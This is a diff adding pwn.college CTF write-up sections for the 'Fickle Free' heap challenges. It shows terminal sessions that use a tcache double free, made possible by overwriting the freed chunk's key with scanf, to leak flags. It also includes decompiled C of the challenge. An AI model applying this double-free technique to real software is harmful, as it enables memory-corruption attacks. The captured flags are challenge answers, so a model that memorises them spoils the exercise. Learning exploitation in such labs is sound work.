@@ -840,3 +840,209 @@ Data: pwn.college{8Wq-xUWLolH-kpTT9mLLl4qgFmM.0lN3MDL4ITM0EzW}
 
 ### Goodbye!
 ```
+
+&nbsp;
+
+## Fickle Free (Easy)
+
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~fickle-free-easy:~$ /challenge/fickle-free-easy 
+###
+### Welcome to /challenge/fickle-free-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 1 unique allocations.
+
+In this challenge, the flag buffer is allocated 2 times before it is used.
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc   
+
+Size: 784
+
+[*] allocations[0] = malloc(784)
+[*] allocations[0] = 0x5dbbb3dcb2c0
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): free
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | (nil)               | 0x5dbbb3dcb010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf
+
+[*] scanf("%792s", allocations[0])
+AAAAAAAAA
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x4141414141414141  | 0x5dbbb3dc0041      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): free
+
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 2     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
+| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag
+
+[*] flag_buffer = malloc(784)
+[*] flag_buffer = 0x5dbbb3dcb2c0
+[*] flag_buffer = malloc(784)
+[*] flag_buffer = 0x5dbbb3dcb2c0
+[*] read the flag!
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): puts
+
+[*] puts(allocations[0])
+Data: pwn.college{Mbk_-TzLM_emeeQEjY3XeOkWk_p.01N3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): quit
+
+### Goodbye!
+```
+
+&nbsp;
+
+## Fickle Free (Hard)
+
+This time we need to find the size of the buffer into which the flag is read.
+
+### Binary Analysis
+
+```c title="/challenge/fickle-free-hard :: main()" showLineNumbers 
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int v4; // ecx
+  int i; // [rsp+2Ch] [rbp-B4h]
+  unsigned int size; // [rsp+34h] [rbp-ACh]
+  void *size_4; // [rsp+38h] [rbp-A8h]
+  void *ptr; // [rsp+48h] [rbp-98h]
+  char choice[136]; // [rsp+50h] [rbp-90h] BYREF
+  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]
+
+  v11 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(_bss_start, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  ptr = 0LL;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            puts(byte_2020);
+            printf("[*] Function (malloc/free/puts/scanf/read_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2020);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_2020);
+            size = atoi(choice);
+            ptr = malloc(size);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          free(ptr);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Data: ");
+        puts((const char *)ptr);
+      }
+      if ( strcmp(choice, "scanf") )
+        break;
+      v3 = malloc_usable_size(ptr);
+      sprintf(choice, "%%%us", v3);
+      __isoc99_scanf(choice, ptr);
+      puts(byte_2020);
+    }
+    if ( strcmp(choice, "read_flag") )
+      break;
+    for ( i = 0; i <= 1; ++i )
+      size_4 = malloc(328uLL);
+    v4 = open("/flag", 0);
+    read(v4, size_4, 128uLL);
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+- [x] Size of memory allocation into which the flag is read: `328`
+
+### Exploit
+
+```
+hacker@dynamic-allocator-misuse~fickle-free-hard:~$ /challenge/fickle-free-hard 
+###
+### Welcome to /challenge/fickle-free-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc
+
+Size: 328
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): free
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf
+
+AAAAAAAAA
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): free
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): puts
+
+Data: pwn.college{Amc7hATLzmOx9D_YV-iznVKLvb-.0FO3MDL4ITM0EzW}
+
+
+[*] Function (malloc/free/puts/scanf/read_flag/quit): quit    
+
+### Goodbye!
+```
